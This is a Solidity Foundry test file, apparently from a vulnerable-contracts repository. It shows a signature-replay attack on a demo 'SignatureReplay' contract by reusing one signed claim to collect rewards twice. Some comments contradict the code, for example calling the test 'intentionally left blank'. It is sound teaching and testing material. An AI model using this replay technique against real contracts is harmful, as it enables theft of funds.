// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {SignatureReplay} from "../../src/vulnerable/SignatureReplay.sol";

/**
 * PoC:
 * - Attacker signs a valid signature for the vulnerable SignatureReplay contract.
 * - The attacker can then replay that signature multiple times to claim rewards without having to generate new signatures.
 *
 * This test demonstrates the vulnerability in SignatureReplay.sol where no nonce or timestamp is used to prevent replay attacks.
 */

contract Test_SignatureReplay is Test {
    // This test is intentionally left blank as the vulnerability is in the contract logic, not in a specific function that can be unit tested.
    // The vulnerability allows for replaying valid signatures, which would require integration testing with off-chain signature generation to demonstrate.
    SignatureReplay target;
    uint256 signerPk;
    address signer;
    address user = address(0xB0B);

    function setUp() public {
        signerPk = 0xA11CE;
        signer = vm.addr(signerPk);

        target = new SignatureReplay(signer);
        vm.deal(user, 1 ether);
        // Deploy the vulnerable contract with a trusted signer (for demonstration, we use the test contract itself as the signer)
    }

    function test_SignatureReplay() public {
        uint256 amount = 100;
        bytes32 messageHash = keccak256(
            abi.encodePacked(address(this), amount)
        );
        bytes32 ethSignedMessageHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
            signerPk,
            ethSignedMessageHash
        );
        bytes memory signature = abi.encodePacked(r, s, v);

        // First claim should succeed
        target.claim(amount, signature);
        console.log(
            "Claimed total after first claim:",
            target.claimedTotal(user)
        );
        console.log("Expected claimed total after first claim:", amount);
        assertEq(target.claimedTotal(address(this)), amount);

        // Replay the same signature to claim again (this should not be allowed in a secure implementation)
        target.claim(amount, signature);
        assertEq(target.claimedTotal(address(this)), amount * 2); // Vulnerable to replay, total is now 200 instead of remaining 100
    }
}
